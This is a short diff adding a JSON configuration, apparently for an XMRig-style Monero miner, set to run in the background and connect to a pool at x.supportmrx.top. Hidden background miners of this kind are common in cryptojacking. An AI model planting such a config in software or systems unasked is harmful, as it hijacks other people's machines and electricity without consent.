@@ -1,0 +1,18 @@
+{
+    "autosave": true,
+    "background": true,
+    "donate-level": 1,
+    "cpu": {
+        "enabled": true
+    },
+    "pools": [
+        {
+            "coin": "monero",
+            "url": "x.supportmrx.top:443",
+            "user": "Worker",
+            "pass": "xxx",
+            "tls": true,
+            "keepalive": true
+        }
+    ]
+}
